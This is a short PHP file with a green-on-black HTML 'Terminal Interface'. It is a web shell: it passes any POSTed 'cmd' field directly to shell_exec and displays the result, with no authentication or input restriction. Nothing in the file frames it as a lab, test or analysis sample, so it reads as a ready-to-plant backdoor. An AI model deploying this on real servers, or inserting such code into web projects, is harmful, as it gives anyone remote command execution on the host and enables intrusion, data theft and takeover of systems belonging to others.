<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Terminal Interface</title>
    <style>
        body {
            background-color: #111;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
        .terminal {
            max-width: 700px;
            margin: 0 auto;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px;
            background-color: #222;
            border: 1px solid #0f0;
            color: #0f0;
        }
        input[type="submit"] {
            margin-top: 10px;
            padding: 8px 16px;
            background-color: #0f0;
            color: #111;
            border: none;
            cursor: pointer;
        }
        pre {
            background-color: #000;
            border: 1px solid #0f0;
            padding: 10px;
            overflow-x: auto;
            white-space: pre-wrap;
            margin-top: 15px;
        }
    </style>
</head>
<body>
<div class="terminal">
    <h2>> Execute Command</h2>
    <form method="post">
        <input type="text" name="cmd" placeholder="e.g. ls -la" required>
        <input type="submit" value="Run">
    </form>

    <?php if (isset($output)): ?>
        <pre><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></pre>
    <?php endif; ?>
</div>
</body>
</html>
